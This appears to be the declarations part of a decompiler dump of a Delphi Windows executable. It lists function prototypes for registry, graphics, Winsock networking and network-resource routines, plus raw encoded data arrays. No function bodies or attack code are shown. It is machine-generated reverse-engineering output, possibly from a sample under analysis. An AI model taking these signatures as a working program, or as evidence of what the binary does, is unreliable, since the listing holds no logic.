// _DWORD *__usercall TReader::ReadStr@<eax>(TReader *this@<ecx>, _DWORD *a2@<eax>, BYTE **a3@<edx>);
// _DWORD *__usercall TReader::ReadString@<eax>(TReader *this@<ecx>, _DWORD *a2@<eax>, BYTE **a3@<edx>);
// __int64 __usercall sub_40DF4C@<edx:eax>(_DWORD *a1@<eax>, int a2@<ecx>);
// void __usercall Classes::TReader::SkipSetBody(Classes::TReader *this@<ecx>, _DWORD *a2@<eax>);
void __cdecl Classes::_17116(int a1);
// int __usercall Classes::_16873@<eax>(int result@<eax>, int a2);
int __cdecl Classes::_16874(int a1);
void __cdecl Classes::_16875(int a1);
// void __usercall Classes::TReader::SkipValue(Classes::TReader *this@<ecx>, _DWORD *a2@<eax>);
// void __usercall Classes::TReader::SkipProperty(Classes::TReader *this@<ecx>, _DWORD *a2@<eax>);
// _DWORD *__usercall TWriter::Write@<eax>(TWriter *this@<ecx>, const void *a2@<edx>, _DWORD *result@<eax>);
// int __usercall sub_40E2A8@<eax>(int a1@<eax>);
// _DWORD *__usercall sub_40E2C0@<eax>(_DWORD *a1@<eax>, int a2@<ecx>);
// _DWORD *__usercall sub_40E2C8@<eax>(_DWORD *a1@<eax>, int a2@<ecx>);
// _DWORD *__usercall TWriter::WriteString@<eax>(void *a1@<edx>, _DWORD *a2@<eax>);
// _DWORD *__usercall sub_40E32C@<eax>(_DWORD *a1@<eax>, char a2@<dl>, int a3@<ecx>);
int sub_40E340();
_DWORD *Classes::_17428();
// void __usercall sub_40E3C8(void *a1@<eax>);
int sub_40E3D0();
void __cdecl Classes::initialization();
int Cxfilter::Finalization();
void sub_40E55C();
// int __usercall sub_40E62C@<eax>(DWORD a1@<eax>, void *a2@<edx>);
// bool __usercall sub_40E658@<al>(_BYTE *a1@<eax>);
// int __usercall Registry::_16394@<eax>(char a1@<al>);
// char __usercall Registry::_16395@<al>(int a1@<eax>);
// int __usercall Registry::TRegistry::TRegistry@<eax>(int a1@<eax>, char a2@<dl>);
// void __usercall TStored_Destroy_7_1(int self@<eax>);
// void __usercall Registry::TRegistry::CloseKey(int a1@<eax>);
// void __usercall Registry::TRegistry::SetRootKey(unsigned int a1@<edx>, int a2@<eax>);
// void __usercall Registry::TRegistry::ChangeKey(Registry::TRegistry *this@<ecx>, unsigned int a2@<edx>, int a3@<eax>);
// int __usercall sub_40E7B4@<eax>(int a1@<eax>, char a2@<dl>);
// bool __usercall Registry::TRegistry::OpenKey@<al>(Registry::TRegistry *this@<ecx>, const int System::AnsiString@<edx>, int a3@<eax>);
// int __usercall Registry::TRegistry::GetDataInfo@<eax>(int a1@<eax>, char *a2@<edx>, DWORD a3@<ecx>, int a4@<ebx>);
// int __usercall Registry::TRegistry::GetDataSize@<eax>(const int System::AnsiString@<edx>, int a2@<eax>);
// void __usercall Registry::TRegistry::WriteString(int a1@<eax>, char *a2@<edx>, char *a3@<ecx>);
// int __usercall Registry::TRegistry::ReadString@<eax>(Registry::TRegistry *this@<ecx>, const int System::AnsiString@<edx>, int a3@<eax>);
// void __userpurge Registry::TRegistry::PutData(int a1@<eax>, char *a2@<edx>, const BYTE *a3@<ecx>, char a4, DWORD cbData);
// int __userpurge Registry::TRegistry::GetData@<eax>(int a1@<ecx>, int a2@<edx>, int a3@<eax>, LPBYTE lpData, int cbData, DWORD a6);
// int __usercall sub_40EAE4@<eax>(int a1@<eax>, char *a2@<edx>, int a3@<ebx>);
int Cxfilter::Finalization();
void sub_40EB54();
// HICON __stdcall ExtractIconA(HINSTANCE hInst, LPCSTR pszExeFileName, UINT nIconIndex);
int Finalization_0_7_5();
void sub_40EB94();
// _WORD *__userpurge sub_40EB9C@<eax>(_WORD *result@<eax>, _WORD *a2@<ecx>, int a3);
// _WORD *__usercall sub_40EBC4@<eax>(char a1@<al>, _WORD *a2@<edx>, int a3@<ecx>);
// void __userpurge sub_40EDA4(int a1@<eax>, char a2@<dl>, char a3@<cl>, BYTE **a4);
int sub_40EEAC();
// void __usercall sub_40EF00(char a1@<al>, char **a2@<edx>);
// char __usercall sub_40F230@<al>(int a1@<eax>, char a2@<dl>, signed __int32 a3@<ecx>);
int Finalization_0_7_6();
void sub_40F378();
// void __usercall sub_40F3B4(int a1@<eax>, BYTE **a2@<edx>);
// void __usercall sub_40F4CC(int a1@<eax>, BYTE **a2@<edx>);
int Finalization_0_7_7();
void sub_40F684();
// int __usercall sub_40F6B4@<eax>(int result@<eax>, int *a2@<edx>);
// _DWORD *__usercall sub_40F6C4@<eax>(_DWORD *result@<eax>);
// int __stdcall closesocket(SOCKET s);
// int __stdcall connect(SOCKET s, const struct sockaddr *name, int namelen);
// int __stdcall getpeername(SOCKET s, struct sockaddr *name, int *namelen);
// int __stdcall getsockname(SOCKET s, struct sockaddr *name, int *namelen);
// u_short __stdcall htons(u_short hostshort);
// unsigned int __stdcall inet_addr(const char *cp);
// int __stdcall ioctlsocket(SOCKET s, int cmd, u_long *argp);
// int __stdcall recv(SOCKET s, char *buf, int len, int flags);
// int __stdcall select(int nfds, fd_set *readfds, fd_set *writefds, fd_set *exceptfds, const struct timeval *timeout);
// int __stdcall send(SOCKET s, const char *buf, int len, int flags);
// SOCKET __stdcall socket(int af, int type, int protocol);
// struct hostent *__stdcall gethostbyname(const char *name);
// struct protoent *__stdcall getprotobynumber(int number);
// struct servent *__stdcall getservbyname(const char *name, const char *proto);
// int __stdcall gethostname(char *name, int namelen);
// int __stdcall WSAGetLastError();
// int __stdcall WSAStartup(WORD wVersionRequested, LPWSADATA lpWSAData);
int Finalization_0_7_8();
void sub_40F784();
// int __usercall sub_40F908@<eax>(void *a1@<eax>, char a2@<dl>);
// void __usercall TStored_Destroy_7_2(int self@<eax>);
// void __userpurge sub_40F998(int a1@<eax>, int a2@<edx>, char *a3@<ecx>, char *a4);
// void __usercall sub_40FAA4(int a1@<eax>, int a2@<ecx>);
// int __usercall sub_40FAC8@<eax>(int a1@<eax>);
// void __usercall sub_40FAD4(int a1@<eax>, char *a2@<edx>, char *a3@<ecx>);
// int __usercall sub_40FB60@<eax>(int a1@<eax>);
// int __usercall sub_40FB94@<eax>(int len@<ecx>, char *buf@<edx>, int a3@<eax>);
// int __usercall sub_40FBBC@<eax>(int a1@<eax>, char a2@<dl>);
// void __usercall sub_40FBE8(int a1@<eax>, char *a2@<edx>);
// int __usercall sub_40FC58@<eax>(int len@<ecx>, char *buf@<edx>, int a3@<eax>);
// int __usercall sub_40FC90@<eax>(int a1@<eax>, int a2@<edx>, int a3@<ecx>);
// void __usercall sub_40FCF0(int a1@<eax>, int a2@<edx>, char **a3@<ecx>);
// int __usercall sub_40FF04@<eax>(int len@<ecx>, char *buf@<edx>, int a3@<eax>);
// int __usercall sub_40FF2C@<eax>(int a1@<eax>, int a2@<edx>, int a3@<ecx>);
// int __usercall sub_40FF88@<eax>(int a1@<eax>, int a2@<edx>);
// void __usercall sub_40FF9C(int a1@<eax>, int a2@<ecx>);
// u_long __usercall sub_41005C@<eax>(int a1@<eax>, u_long a2@<ecx>);
int __fastcall sub_410074(LStr *a1, BYTE **a2);
// int __usercall sub_410100@<eax>(int a1@<eax>, int a2@<edx>);
// void __usercall sub_410188(int a1@<eax>);
// void __usercall sub_4101AC(int a1@<eax>, char **a2@<edx>, int a3@<ecx>);
int Finalization_0_7_9();
void sub_410E88();
int Finalization_0_7_10();
void sub_410EE4();
// void __usercall sub_410F04(char **a1@<eax>);
// OLECHAR **__userpurge sub_411110@<eax>(char **a1@<eax>, int a2, int a3);
// void __usercall sub_4112E4(char *a1@<eax>, int a2@<edx>, char **a3@<ecx>);
// void __usercall sub_41137C(char *a1@<eax>, int a2@<edx>, char **a3@<ecx>);
// void __usercall sub_41140C(char *a1@<eax>, char **a2@<edx>, int a3@<ebx>);
// void __usercall sub_4114A8(char *a1@<eax>, char **a2@<edx>, int a3@<ebx>);
int Idcookie::Finalization();
void sub_41163C();
// _DWORD *__usercall sub_411838@<eax>(_DWORD *a1@<eax>, char a2@<dl>);
// _DWORD *__usercall sub_411894@<eax>(_DWORD *a1@<eax>, char a2@<dl>);
// void __usercall sub_4118CC(int a1@<eax>);
// void __usercall sub_411E58(int a1@<eax>, char *a2@<edx>, int a3@<ebx>, int a4@<edi>, int a5@<esi>);
// void __usercall sub_411F70(int a1@<eax>, char *a2@<edx>);
// void __userpurge sub_412048(int a1@<eax>, char a2@<dl>, char a3@<cl>, int a4@<ebx>, int a5@<edi>, int a6@<esi>, char **a7);
// int __usercall sub_412184@<eax>(int a1@<eax>);
// void __usercall sub_412240(char *a1@<eax>, char **a2@<edx>, int a3@<edi>);
// void __usercall sub_4122C8(char *a1@<eax>, char **a2@<edx>, int a3@<ebx>, int a4@<edi>);
// void __usercall sub_41238C(char **a1@<eax>);
int sub_41243C();
void sub_412484();
// _DWORD *__usercall sub_412560@<eax>(_DWORD *a1@<eax>, char a2@<dl>);
// _DWORD *__usercall sub_4125C4@<eax>(_DWORD *a1@<eax>, char a2@<dl>);
// int __usercall sub_412604@<eax>(int a1@<eax>);
// void __usercall sub_412620(int a1@<eax>, int a2@<edx>);
// void __usercall sub_412708(int a1@<eax>, void *a2@<edx>, int a3@<ebx>, int a4@<edi>, int a5@<esi>);
// void __usercall sub_412844(int a1@<eax>, struct _EXCEPTION_REGISTRATION_RECORD *a2@<ebx>, int a3@<edi>, int a4@<esi>);
// void __usercall sub_412A08(int a1@<eax>, int a2@<edi>);
int Finalization_0_7_11();
void sub_412CB0();
// char **__usercall sub_412D28@<eax>(char **a1@<eax>, char a2@<dl>);
// void __usercall Dxdockcontrol::TdxDockSiteHideBar::~TdxDockSiteHideBar(_DWORD *a1@<eax>, char a2@<dl>);
// int __usercall sub_412DD0@<eax>(int a1@<eax>, int a2@<ebx>, int a3@<edi>, int a4@<esi>);
// int __usercall sub_412EA0@<eax>(int a1@<eax>, int a2@<edi>);
// int __usercall sub_412F7C@<eax>(int a1@<eax>, int a2@<edi>, int a3@<esi>);
// int __usercall sub_412FB0@<eax>(int a1@<eax>, char *a2@<edx>, int a3@<edi>);
// int __usercall sub_41306C@<eax>(int a1@<eax>, char *a2@<edx>, int a3@<edi>);
// char __usercall sub_413128@<al>(int a1@<eax>, int a2@<edx>, int a3@<ebx>, int a4@<edi>);
// char __userpurge sub_413258@<al>(char *a1@<eax>, char *a2@<edx>, char *a3@<ecx>, int a4@<ebx>, int a5@<edi>, int a6@<esi>, int a7);
int Finalization_0_7_12();
void sub_413398();
// _DWORD *__usercall Graphics::_16453@<eax>(int a1@<eax>, char a2@<dl>, __int16 a3@<cx>);
// void __usercall Graphics::_16454(_DWORD *a1@<eax>, char a2@<dl>);
// void __usercall sub_4137CC(int a1@<eax>);
// void __usercall sub_4137D8(int a1@<eax>);
// signed int __usercall sub_413B3C@<eax>(signed int result@<eax>);
// char __usercall sub_413B4C@<al>(int a1@<eax>, char **a2@<edx>);
// char __usercall sub_413B5C@<al>(_BYTE *a1@<eax>, _DWORD *a2@<edx>);
// char __usercall sub_413D20@<al>(int a1@<eax>, char **a2@<edx>);
// char __usercall sub_413D30@<al>(_BYTE *a1@<eax>, _DWORD *a2@<edx>);
// int __usercall Graphics::TFont::GetHandle@<eax>(int a1@<eax>);
// char __usercall sub_413EE8@<al>(int a1@<eax>);
// int __usercall Graphics::TPen::GetHandle@<eax>(int a1@<eax>);
// int __usercall sub_413F88@<eax>(int a1@<eax>);
// int __usercall Graphics::TBrush::GetHandle@<eax>(int a1@<eax>);
// char __usercall sub_414070@<al>(int a1@<eax>);
// void __usercall Graphics::TCanvas::Lock(int a1@<eax>);
// BOOL __usercall Graphics::TCanvas::MoveTo@<eax>(Graphics::TCanvas *this@<ecx>, int a2@<edx>, int a3@<eax>);
// bool __usercall Graphics::TCanvas::TryLock@<al>(int a1@<eax>);
// void __usercall Graphics::TCanvas::Unlock(int a1@<eax>);
// BOOL __usercall Graphics::TCanvas::GetPenPos@<eax>(Graphics::TCanvas *this@<ecx>, int a2@<eax>, struct tagPOINT *a3@<edx>);
// BOOL __usercall sub_414174@<eax>(int a1@<eax>, int a2@<edx>);
// char __usercall Graphics::TCanvas::DeselectHandles@<al>(int a1@<eax>);
// int __usercall Graphics::TCanvas::SetHandle@<eax>(unsigned int a1@<edx>, int a2@<eax>);
// int __usercall Graphics::TCanvas::RequiredState@<eax>(Graphics::TCanvas *this@<ecx>, int result@<eax>, char a3@<dl>);
// COLORREF __usercall Graphics::TCanvas::CreateFont@<eax>(int a1@<eax>);
// int __usercall Graphics::TCanvas::CreatePen@<eax>(int a1@<eax>);
// int __usercall Graphics::TCanvas::CreateBrush@<eax>(int a1@<eax>);
void __fastcall sub_414390(int a1, void *a2);
void __fastcall sub_4143A8(int a1, void *a2);
void __fastcall sub_4143C0(int a1, void *a2);
void __fastcall sub_4143CC(int a1, void *a2);
void sub_4143D8();
void Graphics::_16596();
// int __usercall sub_4144D4@<eax>(int a1@<eax>);
// HGDIOBJ __usercall Graphics::_16598@<eax>(void *a1@<eax>, int *a2@<edx>, char a3@<cl>);
// int __usercall Graphics::_16599@<eax>(__int16 a1@<ax>);
// int __usercall sub_414664@<eax>(int a1@<eax>, int a2@<edx>, int a3@<ecx>);
// HPALETTE __usercall Graphics::_16605@<eax>(BYTE *a1@<eax>);
int __cdecl System::__linkproc__ HandleFinally(int, int); // weak
// int __userpurge Graphics::_16609@<eax>(int a1@<ecx>, int a2@<edx>, BITMAPINFOHEADER *a3@<eax>, int a4, int a5);
// int __usercall sub_41494C@<eax>(int result@<eax>);
// bool __usercall Graphics::_16611@<al>(unsigned __int8 *a1@<eax>, unsigned __int8 *a2@<edx>, int a3);
// int __userpurge Graphics::ReadIcon@<eax>(int a1@<eax>, HICON *a2@<edx>, int a3@<ecx>, int *a4, int *a5, int a6);
// unsigned int __usercall Graphics::_16614@<eax>(HGDIOBJ a1@<ecx>, void *a2@<eax>, int a3@<edx>);
// int __userpurge Graphics::_16628@<eax>(void *a1@<eax>, int *a2@<edx>, _DWORD *a3@<ecx>, void *a4);
// bool __userpurge Graphics::_16617@<al>(LPBITMAPINFO lpbmi@<ecx>, HPALETTE hPal@<edx>, HBITMAP a3@<eax>, int a4, LPVOID lpvBits);
int nullsub_1(void); // weak
// int __usercall sub_414EEC@<eax>(int result@<eax>);
// BOOL __usercall Graphics::_16621@<eax>(int a1@<eax>, HICON a2@<edx>, char a3@<cl>);
// void __usercall EJSONException_Create(void *TGraphic_Self@<eax>);
// int __usercall sub_41512C@<eax>(int result@<eax>, int a2@<ecx>);
char __cdecl Graphics::_16624(int a1);
// int __usercall Graphics::TGraphic::DefineProperties@<eax>(int a1@<eax>, int a2@<edx>);
// char __usercall TGraphic::Equals@<al>(int a1@<eax>, int a2@<edx>);
int sub_41532C();
// char __usercall sub_415330@<al>(int a1@<eax>);
// _DWORD *__usercall Graphics::TGraphic::LoadFromFile@<eax>(Classes::TFileStream *System::AnsiString@<edx>, int a2@<eax>);
// int __userpurge Graphics::TGraphic::Progress@<eax>(int result@<eax>, int a2@<ebx>, int a3, int a4, char a5, char a6);
// int __usercall sub_4153B0@<eax>(int a1@<eax>);
// _DWORD *__usercall TGraphic::SaveToFile@<eax>(int a1@<eax>, Classes::TFileStream *a2@<edx>);
// _BYTE *__usercall sub_415418@<eax>(_BYTE *result@<eax>, char a2@<dl>);
// int __usercall sub_415428@<eax>(int a1@<eax>);
void Controls::_16617();
// void __usercall Graphics::_16736(_DWORD *a1@<eax>);
// int __usercall sub_415580@<eax>(int result@<eax>);
// _DWORD *__usercall sub_415584@<eax>(_DWORD *result@<eax>);
// void __usercall Cxedit::TcxCustomEditData::~TcxCustomEditData(_DWORD *a1@<eax>, char a2@<dl>);
// int __usercall sub_4155D4@<eax>(int a1@<eax>);
// _BYTE *__usercall Graphics::TIcon::TIcon@<eax>(_BYTE *a1@<eax>, char a2@<dl>);
// void __usercall sub_415640(_DWORD *a1@<eax>, char a2@<dl>);
// void __usercall Graphics::TIcon::Assign(int a1@<eax>, int a2@<edx>);
// BOOL __usercall Graphics::TIcon::Draw@<eax>(HICON a1@<eax>, int a2@<edx>, int a3@<ecx>);
// bool __usercall sub_415710@<al>(int a1@<eax>);
// int __usercall sub_415728@<eax>(HICON a1@<eax>);
// int __usercall sub_41573C@<eax>(int a1@<eax>);
// int __usercall sub_415750@<eax>(int a1@<eax>);
// HICON __usercall Graphics::TIcon::HandleNeeded@<eax>(HICON result@<eax>);
// int __usercall Graphics::TIcon::ImageNeeded@<eax>(Graphics::TIcon *this@<ecx>, int result@<eax>, void *a3@<edx>);
// int __usercall Graphics::TIcon::LoadFromStream@<eax>(Classes::TStream *a1@<edx>, int a2@<eax>);
// int __usercall TIcon::NewImage@<eax>(int a1@<eax>, int a2@<edx>, int a3@<ecx>);
// int __usercall sub_4159BC@<eax>(int a1@<eax>, int a2@<edx>);
// void __usercall sub_4159D4(int a1@<eax>, void *a2@<edx>);
// void __usercall sub_4159F0(int a1@<eax>, void *a2@<edx>);
// void __usercall Graphics::TIcon::SaveToStream(Graphics::TIcon *this@<ecx>, Classes::TStream *a2@<edx>, int a3@<eax>);
void __fastcall sub_415A34(int a1, void *a2, int a3);
void __fastcall sub_415A48(int a1, void *a2, int a3);
HPALETTE Graphics::_16878();
// int __usercall Graphics::GetDefFontCharSet@<eax>(int a1@<ebx>);
// char __usercall Graphics::_16837@<al>(int a1@<ebx>);
// _DWORD *__usercall Graphics::_16840@<eax>(int a1@<eax>, char a2@<dl>);
// void __usercall Graphics::_16841(_DWORD *a1@<eax>, char a2@<dl>);
// void __usercall sub_415C0C(int a1@<eax>);
// void __usercall sub_415C18(int a1@<eax>);
// _DWORD *__usercall Graphics::_16846@<eax>(int a1@<eax>);
int Graphics::Finalization();
// void __usercall Graphics::initialization(int a1@<ebx>);
// BOOL __stdcall InternetGetConnectedState(LPDWORD lpdwFlags, DWORD dwReserved);
int Finalization_0_7_13();
void sub_415EA4();
// void __userpurge sub_415EAC(int a1@<eax>, char *a2@<edx>, char *a3@<ecx>, char **a4, int a5, int a6);
// void __usercall sub_415FAC(int a1@<eax>, int a2@<edx>, char **a3@<ecx>);
// int __usercall sub_41609C@<eax>(int a1@<eax>, BYTE **a2@<edx>);
// int __usercall sub_416178@<eax>(char *a1@<eax>, char *a2@<edx>, char a3@<cl>);
// void __usercall sub_41620C(int a1@<eax>, BYTE **a2@<edx>);
// void __usercall sub_4162DC(int a1@<eax>, int a2@<edx>, char *a3@<ecx>);
// void __userpurge sub_41639C(int a1@<eax>, int a2@<edx>, int a3@<ecx>, int a4, int a5);
// void __userpurge sub_416478(char *a1@<eax>, char *a2@<edx>, BYTE *a3@<ecx>, char a4, int a5, int a6, int a7, int a8, int a9, char *a10);
// void __userpurge sub_41692C(int a1@<eax>, int a2@<edx>, char *a3@<ecx>, char **a4);
// void __userpurge sub_416A1C(char *a1@<eax>, char *a2@<edx>, int a3@<ecx>, char **a4);
// void __usercall sub_416B20(char *a1@<eax>, char *a2@<edx>, int a3@<ecx>);
// void __usercall sub_416C54(char *a1@<eax>, int a2@<edx>);
// int __usercall sub_417118@<eax>(char *a1@<eax>);
// int __userpurge sub_4171C0@<eax>(char *a1@<eax>, char *a2@<edx>, BYTE *a3@<ecx>, char a4, int a5, int a6, char *a7);
void __cdecl sub_4173F0(int a1);
// void __usercall sub_4174BC(int a1@<eax>, LStr *a2@<ecx>);
// void __usercall sub_4175AC(int a1@<ebx>, int a2@<edi>, int a3@<esi>);
// int __usercall sub_4177BC@<eax>(int a1@<eax>, int a2@<edi>);
// void __userpurge sub_417928(BYTE *a1@<eax>, char *a2@<edx>, int a3@<ecx>, int a4);
// void __usercall sub_417C20(BYTE *a1@<eax>, int a2@<edx>, int a3@<ecx>, int a4);
// void __userpurge sub_417C88(BYTE *a1@<eax>, int a2@<edx>, int a3@<ecx>, int a4@<edi>, int a5, int a6);
// void __userpurge sub_417D9C(BYTE *a1@<eax>, BYTE *a2@<edx>, BYTE *a3@<ecx>, int a4, int a5, int a6);
// int *__usercall sub_417F24@<eax>(int a1@<eax>, int a2@<edi>);
// void __usercall sub_418438(char *a1@<eax>, char *a2@<edx>);
// void __usercall sub_4184C4(struct _NETRESOURCEA *a1@<eax>, int a2);
// void __usercall sub_418880(char *a1@<eax>);
// void __userpurge sub_418C48(char *a1@<eax>, int a2@<edx>, int a3@<ebx>, int a4@<esi>, __int64 a5);
// void __usercall sub_418DC8(char *a1@<eax>);
// char __usercall sub_418E24@<al>(char *a1@<eax>, char *a2@<edx>, FARPROC *a3@<ecx>);
// int __usercall sub_418EBC@<eax>(char a1@<al>, int a2@<ebx>);
int sub_418FB8(); // weak
// char __usercall sub_418FBC@<al>(char *a1@<eax>, int a2@<edi>, int a3@<esi>);
// void __usercall sub_419074(char **a1@<eax>);
// void __usercall sub_4190CC(int a1@<edi>, int a2@<esi>);
// void __usercall sub_41A5E4(int a1@<ebx>, int a2@<edi>, int a3@<esi>);
// void __usercall sub_41A77C(int a1@<eax>, char **a2@<edx>, LStr *a3@<ecx>);
int __thiscall sub_41A7EC(int (__stdcall *this)());
int __thiscall sub_41A848(LStr *this);
// void __usercall __noreturn start(int a1@<edi>);

//-------------------------------------------------------------------------
// Data declarations

int dword_401004[2] = { 1951598090, 1735289202 }; // weak
_UNKNOWN loc_4019BA; // weak
_UNKNOWN loc_4019C1; // weak
_UNKNOWN loc_401A9E; // weak
_UNKNOWN loc_401AA5; // weak
_UNKNOWN loc_40214C; // weak
_UNKNOWN loc_402153; // weak
_UNKNOWN loc_4022F2; // weak
_UNKNOWN loc_4022F9; // weak
_UNKNOWN loc_402585; // weak
_UNKNOWN loc_40258C; // weak
char byte_402641[] = { '' }; // weak
_UNKNOWN loc_402AF9; // weak
_UNKNOWN loc_402B00; // weak
_UNKNOWN loc_402F0B; // weak
_UNKNOWN loc_402F37; // weak
_UNKNOWN loc_402F90; // weak
_UNKNOWN loc_402FFF; // weak
_UNKNOWN loc_403141; // weak
_UNKNOWN loc_403226; // weak
_UNKNOWN loc_403286; // weak
char byte_4038ED = '\0'; // weak
_UNKNOWN loc_404028; // weak
_UNKNOWN loc_40416C; // weak
_UNKNOWN loc_404173; // weak
_UNKNOWN loc_404301; // weak
_UNKNOWN loc_404366; // weak
_UNKNOWN loc_404377; // weak
_UNKNOWN loc_4048E4; // weak
_UNKNOWN loc_4048EB; // weak
const CHAR byte_404A10[4] = { '\0', '\0', '\0', '\0' }; // idb
_UNKNOWN loc_404ADF; // weak
_UNKNOWN loc_404B74; // weak
_UNKNOWN loc_404B7B; // weak
int dword_4050ED = 3; // weak
_UNKNOWN loc_405876; // weak
_UNKNOWN loc_405968; // weak
int dword_405974 = 0; // weak
_UNKNOWN loc_405AD9; // weak
_UNKNOWN loc_405EE1; // weak
_UNKNOWN loc_4061B1; // weak
int dword_4061D8[5] = { 1398016526, 1668440421, 1667584616, 344, 1 }; // weak
int dword_406240[2] = { 14, 65536 }; // weak
int dword_406304[4] = { 1968129292, 1298550644, 1919905125, 4230521 }; // weak
int dword_406360[3] = { 1850295563, 1165260111, 1919906418 }; // weak
int dword_4063B8[3] = { 2017805577, 1852990836, -1064604575 }; // weak
int dword_406410[5] = { 2017805586, 1852990836, 2017815649, 1953523043, -1871810711 }; // weak
int dword_40678C[4] = { 1850295567, 1768710518, 1768902756, 1919251566 }; // weak
int dword_406844[4] = { 1866679565, 1919252078, 1920091508, -1064603025 }; // weak
int dword_4068A0[5] = { 1665221904, 1936942435, 1819240790, 1869182049, 4230510 }; // weak
int dword_406A68[5] = { 1933657360, 1953654131, 1181642601, 1701603681, 4230500 }; // weak
int dword_406AC8[4] = { 1648444686, 1634890867, 1917154403, -1871548558 }; // weak
int dword_406B80[3] = { 1767326987, 1160917870, 1919906418 }; // weak
_UNKNOWN unk_406BFC; // weak
int dword_406C68[2] = { 14, 65536 }; // weak
_UNKNOWN loc_406D26; // weak
_UNKNOWN loc_406D2D; // weak
int dword_407018 = 25637; // weak
_UNKNOWN loc_40739B; // weak
_UNKNOWN loc_4073A2; // weak
int dword_4073B4 = 3824686; // weak
int dword_4073E8 = 14940; // weak
int dword_407420 = 14940; // weak
_UNKNOWN loc_407D1D; // weak
_UNKNOWN loc_407D24; // weak
_UNKNOWN loc_407EF0; // weak
_UNKNOWN loc_407EF7; // weak
_UNKNOWN loc_408386; // weak
_UNKNOWN loc_40838D; // weak
int dword_40839C = 26471; // weak
_UNKNOWN loc_40847E; // weak
_UNKNOWN loc_408485; // weak
int dword_408494[3] = { 31097, -1, 4 }; // weak
_UNKNOWN loc_408BE9; // weak
_UNKNOWN loc_408BF0; // weak
void *off_408C14 = &loc_414141; // weak
int dword_408C18 = 32; // weak
int dword_408C74 = 67; // weak
_UNKNOWN loc_408EAF; // weak
_UNKNOWN loc_408EB6; // weak
_UNKNOWN loc_408F61; // weak
_UNKNOWN loc_408F68; // weak
_UNKNOWN loc_40900B; // weak
_UNKNOWN loc_409012; // weak
int dword_409020 = 49; // weak
_UNKNOWN loc_4091E6; // weak
_UNKNOWN loc_4091ED; // weak
int dword_4091FC = 49; // weak
int dword_409200[3] = { 26471, -1, 3 }; // weak
int dword_40920C = 6776679; // weak
int dword_409234[3] = { 25957, -1, 1 }; // weak
int dword_409240 = 101; // weak
int dword_4093D0 = 0; // weak
int dword_4093D4 = 46; // weak
_UNKNOWN loc_4094E6; // weak
_UNKNOWN loc_4094ED; // weak
_UNKNOWN loc_4095B4; // weak
_UNKNOWN loc_4095BB; // weak
int dword_4095EC[4] = { 1163135246, 1919906418, 140731730, 16777216 }; // weak
int dword_40966C[5] = { 1163135502, 1885692792, 1667584628, 8, 1 }; // weak
_UNKNOWN loc_409768; // weak
_UNKNOWN loc_40976F; // weak
_UNKNOWN loc_409A1F; // weak
_UNKNOWN loc_409A26; // weak
_UNKNOWN loc_409AEB; // weak
_UNKNOWN loc_409AF2; // weak
_UNKNOWN loc_409BCD; // weak
_UNKNOWN loc_409BD4; // weak
_UNKNOWN loc_40A2EB; // weak
_UNKNOWN loc_40A2F2; // weak
int dword_40A300[3] = { 48, -1, 6 }; // weak
int dword_40A334[3] = { 28001, -1, 2 }; // weak
int dword_40A340[3] = { 28016, -1, 1 }; // weak
int dword_40A34C[3] = { 104, -1, 2 }; // weak
int dword_40A358[3] = { 26728, -1, 5 }; // weak
_UNKNOWN loc_40A422; // weak
_UNKNOWN loc_40A429; // weak
int dword_40A5FC = 29; // weak
int dword_40A6E8 = 40; // weak
int dword_40A8C8[] = { 0 }; // weak
int (*funcs_40A97A[5])() = { &sub_40A9B6, &sub_40AA18, &sub_40AA8B, &sub_40AA8B, &sub_40AAF1 }; // weak
_UNKNOWN loc_40B2CA; // weak
_UNKNOWN loc_40B33C; // weak
int dword_40B350 = 30768; // weak
_UNKNOWN loc_40B379; // weak
_UNKNOWN loc_40B3B1; // weak
_UNKNOWN loc_40B499; // weak
_UNKNOWN loc_40B51E; // weak
int dword_40B5D8[4] = { 1128678669, 1952540018, 1920091493, -1064603025 }; // weak
int dword_40B634[3] = { 1330005259, 1164862832, 1919906418 }; // weak
int dword_40B6E4[3] = { 1699890442, 1917150305, -1871548558 }; // weak
int dword_40B73C[3] = { 1918321931, 1164276841, 1919906418 }; // weak
int dword_40B794[3] = { 1766606090, 1917154419, -1871548558 }; // weak
int dword_40B7EC[5] = { 1951614224, 1735289202, 1953720652, 1869771333, 4230514 }; // weak
int dword_40B84C[4] = { 1968129295, 1382436724, 1970238309, 1936024434 }; // weak
int dword_40B8A8[5] = { 1850295569, 1768710518, 1701859172, 1769234802, -1064604049 }; // weak
void *off_40B908 = &loc_40C234; // weak
int dword_40B96C[3] = { 1750357003, 1684104562, 1953720652 }; // weak
void *off_40BA94 = &loc_40C630; // weak
int dword_40BB48[5] = { 1398016782, 1852404340, 1702119783, 2157, 256 }; // weak
void *off_40BBB4 = &loc_40C630; // weak
int (*off_40BD88[4])() = { &sub_40D920, &sub_40D8F4, &sub_40D904, &sub_40D914 }; // weak
_DWORD (__fastcall *off_40BE60)(Classes::TMemoryStream *__hidden this, int) = &Classes::TMemoryStream::SetSize; // weak
int dword_40BE88[6] = { 1230245390, 1953391972, 1164992845, 2037544046, 8, 1 }; // weak
_UNKNOWN loc_40BF60; // weak
_UNKNOWN loc_40BF67; // weak
int dword_40BFBC[3] = { 1850299401, 1852785524, -1064602509 }; // weak
_UNKNOWN loc_40C200; // weak
_UNKNOWN loc_40C207; // weak
_UNKNOWN loc_40C415; // weak
_UNKNOWN loc_40C4A4; // weak
_UNKNOWN loc_40C4AB; // weak
_UNKNOWN loc_40C507; // weak
_UNKNOWN loc_40C50E; // weak
_UNKNOWN loc_40C616; // weak
_UNKNOWN loc_40C61D; // weak
int dword_40C62C = 7104878; // weak
_UNKNOWN loc_40C6D1; // weak
_UNKNOWN loc_40C6D8; // weak
_UNKNOWN loc_40C7F2; // weak
_UNKNOWN loc_40C7F9; // weak
_UNKNOWN loc_40C80F; // weak
_UNKNOWN loc_40C816; // weak
_UNKNOWN loc_40C879; // weak
_UNKNOWN loc_40C88A; // weak
_UNKNOWN loc_40C9F5; // weak
_UNKNOWN loc_40C9FC; // weak
_UNKNOWN loc_40CA8C; // weak
_UNKNOWN loc_40CA93; // weak
_UNKNOWN loc_40CB52; // weak
_UNKNOWN loc_40CB59; // weak
_UNKNOWN loc_40CB74; // weak
_UNKNOWN loc_40CB7B; // weak
_UNKNOWN loc_40CBD5; // weak
_UNKNOWN loc_40CBDC; // weak
_UNKNOWN loc_40CCBB; // weak
_UNKNOWN loc_40CCC2; // weak
_UNKNOWN loc_40CD39; // weak
_UNKNOWN loc_40CD40; // weak
_UNKNOWN loc_40CDC4; // weak
_UNKNOWN loc_40CDCB; // weak
_UNKNOWN loc_40CE51; // weak
